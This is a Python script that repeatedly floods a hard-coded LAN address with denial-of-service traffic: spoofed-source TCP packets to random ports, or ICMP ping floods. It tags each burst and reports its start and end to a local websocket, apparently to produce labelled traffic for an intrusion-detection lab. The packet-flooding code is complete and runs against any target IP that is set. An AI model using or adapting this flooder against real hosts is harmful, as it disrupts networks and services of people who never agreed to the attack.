import asyncio
import websockets
import random
from scapy.all import IP, TCP, send, ICMP
from time import sleep

async def send_attack_notification(attack_type, is_start=True):
    uri = "ws://localhost:8765"
    message = f"{attack_type}{'_start' if is_start else '_end'}"
    try:
        async with websockets.connect(uri) as websocket:
            await websocket.send(message)
            print(f"Sent notification for {message}")
    except Exception as e:
        print(f"Could not connect to WebSocket server. Is the server running at {uri}?")
        print("Error:", e)

async def simulate_attack(target_ip):
    attack_type = random.choice(['ddos', 'ping_flood'])
    print(f"Simulating {attack_type.upper()} attack")
    attack_codes = {'ddos': 0xC0, 'ping_flood': 0xC2}

    await send_attack_notification(attack_type, is_start=True)

    num_packets = random.randint(500, 10000) if attack_type == 'ddos' else random.randint(100, 2000)

    if attack_type == 'ddos':
        for _ in range(num_packets):
            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = IP(src=spoofed_ip, dst=target_ip, tos=attack_codes[attack_type])/TCP(dport=random.randint(1, 65535))
            send(packet, verbose=0)
    elif attack_type == 'ping_flood':
        for _ in range(num_packets):
            packet = IP(dst=target_ip, tos=attack_codes[attack_type])/ICMP()
            send(packet, verbose=0)

    await send_attack_notification(attack_type, is_start=False)

if __name__ == "__main__":
    target_ip = "192.168.1.18"
    while True:
        asyncio.run(simulate_attack(target_ip))
        sleep_time = random.randint(10, 60)
        print(f"Waiting {sleep_time} seconds before next attack")
        sleep(sleep_time)
